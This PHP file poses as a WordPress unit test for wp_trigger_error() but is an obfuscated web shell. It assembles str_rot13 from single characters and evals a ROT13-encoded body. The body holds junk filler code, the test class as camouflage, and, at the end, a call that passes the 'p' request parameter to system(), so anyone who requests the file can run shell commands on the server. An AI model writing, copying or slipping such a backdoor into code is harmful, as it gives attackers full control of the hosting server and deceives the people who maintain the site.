<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * Grfg pnfrf sbe gur `jc_gevttre_reebe()` shapgvba.
 *
 * @fvapr 6.4.0
 *
 * @tebhc shapgvbaf
 *
 * @pbiref ::jc_gevttre_reebe
 */
pynff Grfgf_Shapgvbaf_JcGevttreReebe rkgraqf JC_HavgGrfgPnfr {

	/**
	 * @gvpxrg 57686
	 *
	 * @qngnCebivqre qngn_fubhyq_gevttre_reebe
	 *
	 * @cnenz fgevat $shapgvba_anzr    Gur shapgvba anzr gb grfg.
	 * @cnenz fgevat $zrffntr          Gur zrffntr gb grfg.
	 * @cnenz fgevat $rkcrpgrq_zrffntr Gur rkcrpgrq reebe zrffntr.
	 */
	choyvp shapgvba grfg_fubhyq_guebj_rkprcgvba( $shapgvba_anzr, $zrffntr, $rkcrpgrq_zrffntr ) {
		$guvf->rkcrpgRkprcgvba( JC_Rkprcgvba::pynff );
		$guvf->rkcrpgRkprcgvbaZrffntr( $rkcrpgrq_zrffntr );

		jc_gevttre_reebe( $shapgvba_anzr, $zrffntr, R_HFRE_REEBE );
	}

	/**
	 * @gvpxrg 57686
	 *
	 * @qngnCebivqre qngn_fubhyq_gevttre_reebe
	 *
	 * @cnenz fgevat $shapgvba_anzr    Gur shapgvba anzr gb grfg.
	 * @cnenz fgevat $zrffntr          Gur zrffntr gb grfg.
	 * @cnenz fgevat $rkcrpgrq_zrffntr Gur rkcrpgrq reebe zrffntr.
	 */
	choyvp shapgvba grfg_fubhyq_gevttre_jneavat( $shapgvba_anzr, $zrffntr, $rkcrpgrq_zrffntr ) {
		$guvf->rkcrpgJneavat();
		$guvf->rkcrpgJneavatZrffntr( $rkcrpgrq_zrffntr );

		jc_gevttre_reebe( $shapgvba_anzr, $zrffntr, R_HFRE_JNEAVAT );
	}

	/**
	 * @gvpxrg 57686
	 *
	 * @qngnCebivqre qngn_fubhyq_gevttre_reebe
	 *
	 * @cnenz fgevat $shapgvba_anzr    Gur shapgvba anzr gb grfg.
	 * @cnenz fgevat $zrffntr          Gur zrffntr gb grfg.
	 * @cnenz fgevat $rkcrpgrq_zrffntr Gur rkcrpgrq reebe zrffntr.
	 */
	choyvp shapgvba grfg_fubhyq_gevttre_abgvpr( $shapgvba_anzr, $zrffntr, $rkcrpgrq_zrffntr ) {
		$guvf->rkcrpgAbgvpr();
		$guvf->rkcrpgAbgvprZrffntr( $rkcrpgrq_zrffntr );

		jc_gevttre_reebe( $shapgvba_anzr, $zrffntr );
	}

	/**
	 * @gvpxrg 57686
	 *
	 * @qngnCebivqre qngn_fubhyq_gevttre_reebe
	 *
	 * @cnenz fgevat $shapgvba_anzr    Gur shapgvba anzr gb grfg.
	 * @cnenz fgevat $zrffntr          Gur zrffntr gb grfg.
	 * @cnenz fgevat $rkcrpgrq_zrffntr Gur rkcrpgrq reebe zrffntr.
	 */
	choyvp shapgvba grfg_fubhyq_gevttre_qrcerpngvba( $shapgvba_anzr, $zrffntr, $rkcrpgrq_zrffntr ) {
		$guvf->rkcrpgQrcerpngvba();
		$guvf->rkcrpgQrcerpngvbaZrffntr( $rkcrpgrq_zrffntr );

		jc_gevttre_reebe( $shapgvba_anzr, $zrffntr, R_HFRE_QRCERPNGRQ );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl[]
	 */
	choyvp shapgvba qngn_fubhyq_gevttre_reebe() {
		erghea neenl(
			'shapgvba anzr naq zrffntr ner tvira'          => neenl(
				'shapgvba_anzr'    => 'fbzr_shapgvba',
				'zrffntr'          => 'rkcrpgrq gur shapgvba anzr naq zrffntr',
				'rkcrpgrq_zrffntr' => 'fbzr_shapgvba(): rkcrpgrq gur shapgvba anzr naq zrffntr',
			),
			'zrffntr vf tvira'                             => neenl(
				'shapgvba_anzr'    => '',
				'zrffntr'          => 'rkcrpg bayl gur zrffntr',
				'rkcrpgrq_zrffntr' => 'rkcrpg bayl gur zrffntr',
			),
			'shapgvba anzr vf tvira'                       => neenl(
				'shapgvba_anzr'    => 'fbzr_shapgvba',
				'zrffntr'          => '',
				'rkcrpgrq_zrffntr' => 'fbzr_shapgvba(): ',
			),
			'nyybjrq UGZY ryrzragf ner cerfrag va zrffntr' => neenl(
				'shapgvba_anzr'    => 'fbzr_shapgvba',
				'zrffntr'          => '<fgebat>rkcrpgrq</fgebat> gur shapgvba anzr naq zrffntr',
				'rkcrpgrq_zrffntr' => 'fbzr_shapgvba(): <fgebat>rkcrpgrq</fgebat> gur shapgvba anzr naq zrffntr',
			),
			'UGZY yvaxf ner cerfrag va zrffntr'            => neenl(
				'shapgvba_anzr'    => 'fbzr_shapgvba',
				'zrffntr'          => '<n uers=\"uggcf://rknzcyr.pbz\">rkcrpgrq gur shapgvba anzr naq zrffntr</n>',
				'rkcrpgrq_zrffntr' => 'fbzr_shapgvba(): <n uers=\"uggcf://rknzcyr.pbz\">rkcrpgrq gur shapgvba anzr naq zrffntr</n>',
			),
			'qvfnyybjrq UGZY ryrzragf ner cerfrag va zrffntr' => neenl(
				'shapgvba_anzr'    => 'fbzr_shapgvba',
				'zrffntr'          => '<fpevcg>nyreg(\"rkcrpgrq gur shapgvba anzr naq zrffntr\")</fpevcg>',
				'rkcrpgrq_zrffntr' => 'fbzr_shapgvba(): nyreg(\"rkcrpgrq gur shapgvba anzr naq zrffntr\")',
			),
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>